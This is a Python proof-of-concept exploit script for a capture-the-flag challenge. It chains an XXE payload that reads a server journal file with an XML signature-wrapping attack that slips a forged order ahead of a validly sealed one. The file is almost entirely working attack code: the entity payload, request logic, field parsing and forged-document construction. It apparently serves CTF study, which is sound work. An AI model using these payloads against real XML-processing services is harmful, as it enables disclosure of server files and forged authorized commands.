#!/usr/bin/env python3
"""TheCommandSeal — PoC.

Exploit chain: (1) XXE in POST /report whose resolver is sandboxed to the
relay outbox directory leaks the sealed standing order journal; (2) POST
/order suffers an XML signature-wrapping mismatch — with two <order> elements
the seal is verified against the LAST one while the relay acts on the FIRST —
so a forged order rides on the leaked, validly sealed order.

Usage:
    python3 commandseal.py [base_url]

The CTF instance is retired; this PoC documents the exploit path and does not
contact any live service. All sealed-order material (ref/digest/sig) is
recovered at runtime via the XXE; nothing secret is embedded.
"""

import base64
import hashlib
import re
import sys
import xml.sax.saxutils as su

import requests

JOURNAL_PATH = "/opt/relay/outbox/last-order.txt"  # documented in recon
FORGED_ID = "cmd-EVIL"
FORGED_KIND = "standing"       # kind=standing is honoured specially
FORGED_TEXT = "MARKER-standing"

XXE_BODY = f"""<?xml version="1.0"?>
<!DOCTYPE report [<!ENTITY xxe SYSTEM "file://{JOURNAL_PATH}">]>
<report><summary>&xxe;</summary></report>"""


def leak_journal(session: requests.Session, base: str) -> dict:
    r = session.post(f"{base}/report", data=XXE_BODY,
                     headers={"Content-Type": "application/xml"}, timeout=15)
    print(f"[*] POST /report -> {r.status_code}")
    print(r.text)
    fields = {}
    for line in r.text.splitlines():
        m = re.match(r"^(id|kind|text|ref|digest|sig)=(.*)$", line.strip())
        if m:
            fields[m.group(1)] = m.group(2).strip()
    missing = {"id", "kind", "text", "ref", "digest", "sig"} - fields.keys()
    if missing:
        raise RuntimeError(f"journal parse failed; missing fields: {sorted(missing)}")
    return fields


def check_digest(fields: dict) -> None:
    expected = base64.b64encode(
        hashlib.sha256(f"{fields['id']}|{fields['kind']}|{fields['text']}".encode()).digest()
    ).decode()
    status = "match" if expected == fields["digest"] else "MISMATCH"
    print(f"[*] digest recomputation base64(sha256('id|kind|text')): {status}")


def build_wrapped_order(fields: dict) -> str:
    return f"""<relay>
  <order id="{su.escape(FORGED_ID)}"><kind>{su.escape(FORGED_KIND)}</kind><text>{su.escape(FORGED_TEXT)}</text></order>
  <order id="{su.escape(fields['id'])}"><kind>{su.escape(fields['kind'])}</kind><text>{su.escape(fields['text'])}</text></order>
  <auth>
    <ref>{su.escape(fields['ref'])}</ref>
    <digest>{su.escape(fields['digest'])}</digest>
    <sig>{su.escape(fields['sig'])}</sig>
  </auth>
</relay>"""


def main() -> int:
    base = sys.argv[1] if len(sys.argv) > 1 else "http://<instance>"
    session = requests.Session()

    print("[*] recon: root page / report endpoint")
    r = session.get(f"{base}/", timeout=15)
    print(f"    / -> {r.status_code} {r.text[:300]}")

    fields = leak_journal(session, base)
    check_digest(fields)
    print(f"[*] sealed order recovered: id={fields['id']} kind={fields['kind']}")

    body = build_wrapped_order(fields)
    r = session.post(f"{base}/order", data=body,
                     headers={"Content-Type": "application/xml"}, timeout=15)
    print(f"[*] POST /order -> {r.status_code}")
    print(r.text)  # expected: 'command standing order honoured: <clearance>'
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
